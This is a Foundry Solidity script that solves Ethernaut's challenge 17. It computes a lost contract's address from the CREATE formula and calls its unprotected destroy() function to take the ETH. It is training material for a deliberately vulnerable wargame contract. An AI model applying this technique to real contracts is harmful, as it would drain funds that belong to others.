// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

/**
 * @title Challenge 17 Solution Script
 * @notice Compute the lost contract address using CREATE formula and call destroy()
 */
contract RecoverySolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x3e450F0a84569e63027897Da8Fa35a8fBa7ED6C3;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        // The lost SimpleToken was created by the Recovery contract at nonce 1
        // Address = keccak256(rlp([sender, nonce]))[12:]
        // For nonce 1: address = keccak256(rlp([INSTANCE, 1]))[12:]
        address lostContract = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            INSTANCE,
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        console.log("Lost SimpleToken address:", lostContract);
        console.log("Lost contract balance:", lostContract.balance);

        vm.startBroadcast(deployerPrivateKey);

        // Call destroy to recover the ETH
        ISimpleToken(lostContract).destroy(payable(player));

        vm.stopBroadcast();

        console.log("Challenge 17 completed! ETH recovered.");
    }
}
